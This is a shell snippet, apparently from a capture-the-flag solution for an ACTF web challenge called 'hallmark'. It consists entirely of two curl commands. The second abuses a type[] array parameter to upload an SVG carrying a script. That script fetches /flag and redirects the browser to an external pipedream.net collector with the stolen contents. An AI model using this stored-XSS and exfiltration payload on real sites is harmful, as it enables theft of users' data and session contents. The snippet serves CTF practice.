```shell
$ curl -X POST https://hallmark.web.actf.co/card -d 'svg=text&content=satoki'
Found. Redirecting to /card?id=78016e26-b8e0-4f9f-844f-01bc03ebd315
$ curl -X PUT  https://hallmark.web.actf.co/card -d 'id=78016e26-b8e0-4f9f-844f-01bc03ebd315&type[]=image/svg%2Bxml&svg=satoki&content=<?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 864 864" style="enable-background:new 0 0 864 864;" xml:space="preserve">
<script>
fetch("/flag")
    .then((response) => response.text())
    .then((text) => location.href="https://enxh1c9lp9m1.x.pipedream.net/?s="%2Btext);
</script>
</svg>'
```
